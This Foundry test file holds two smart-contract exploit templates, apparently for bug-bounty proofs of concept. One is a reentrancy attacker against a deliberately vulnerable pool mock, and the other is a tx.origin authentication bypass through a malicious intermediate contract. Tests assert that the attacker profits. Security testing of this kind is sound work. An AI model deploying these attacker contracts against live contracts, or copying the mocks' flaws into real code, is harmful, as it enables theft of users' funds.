// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

// ==============================================================================
// TEMPLATE 1: REENTRANCY - $15k-$50k Bounty Potential, 94% Confidence
// Use when: reentrancy-eth, no nonReentrant modifier, CEI pattern violated
// ==============================================================================

interface IVulnerableReentrancy {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint);
}

// Mock for testing template compiles and executes successfully
contract VulnerablePoolMock is IVulnerableReentrancy {
    mapping(address => uint) public balances;
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    function withdraw() external {
        uint bal = balances[msg.sender];
        require(bal > 0, "No balance");
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "Transfer failed");
        balances[msg.sender] = 0; // VULNERABLE - state updated after external call
    }
}

contract ReentrancyAttacker {
    IVulnerableReentrancy public vulnerable;
    uint public attackCount;
    uint public constant MAX_ATTACKS = 3;

    constructor(address _vulnerable) {
        vulnerable = IVulnerableReentrancy(_vulnerable);
    }

    function attack() external payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw();
    }

    fallback() external payable {
        if (attackCount < MAX_ATTACKS && address(vulnerable).balance >= 1 ether) {
            attackCount++;
            vulnerable.withdraw();
        }
    }

    receive() external payable {
        if (attackCount < MAX_ATTACKS && address(vulnerable).balance >= 1 ether) {
            attackCount++;
            vulnerable.withdraw();
        }
    }
}

contract ReentrancyExploitTest is Test {
    IVulnerableReentrancy public vulnerable;
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");
    uint public constant DEPOSIT_AMOUNT = 1 ether;

    function setUp() public {
        VulnerablePoolMock mock = new VulnerablePoolMock();
        vulnerable = IVulnerableReentrancy(address(mock));

        // Victim deposits funds into pool
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vulnerable.deposit{value: 5 ether}();

        // Attacker starting funds
        vm.deal(attacker, 10 ether);
    }

    function testReentrancyExploit() public {
        vm.startPrank(attacker);
        uint attackerBalBefore = attacker.balance;
        
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(vulnerable));
        attackerContract.attack{value: DEPOSIT_AMOUNT}();

        uint attackerBalAfter = attacker.balance + address(attackerContract).balance;
        assertGt(attackerBalAfter, attackerBalBefore, "Exploit failed - no profit");
        vm.stopPrank();
    }
}

// ==============================================================================
// TEMPLATE 2: TX.ORIGIN AUTHENTICATION BYPASS - $10k-$25k Bounty Potential
// ==============================================================================

interface IVulnerableTxOrigin {
    function withdraw() external;
    function owner() external view returns (address);
}

contract VulnerableTxOriginMock is IVulnerableTxOrigin {
    address public owner;
    constructor(address _owner) payable {
        owner = _owner;
    }
    function withdraw() external {
        require(tx.origin == owner, "Not authorized by owner");
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }
}

contract TxOriginIntermediate {
    IVulnerableTxOrigin public vulnerable;
    address public attacker;

    constructor(address _vulnerable, address _attacker) {
        vulnerable = IVulnerableTxOrigin(_vulnerable);
        attacker = _attacker;
    }

    function trickOwner() external payable {
        vulnerable.withdraw();
        (bool ok,) = attacker.call{value: address(this).balance}("");
        require(ok, "Payout failed");
    }

    receive() external payable {}
}

contract TxOriginExploitTest is Test {
    VulnerableTxOriginMock public vulnerable;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vulnerable = new VulnerableTxOriginMock{value: 5 ether}(owner);
    }

    function testTxOriginBypass() public {
        uint attackerBalBefore = attacker.balance;

        // Victim owner accidentally interacts with malicious intermediate contract
        vm.startPrank(owner, owner);
        TxOriginIntermediate intermediate = new TxOriginIntermediate(address(vulnerable), attacker);
        intermediate.trickOwner();
        vm.stopPrank();

        uint attackerBalAfter = attacker.balance;
        assertGt(attackerBalAfter, attackerBalBefore, "TxOrigin exploit failed - no profit");
    }
}
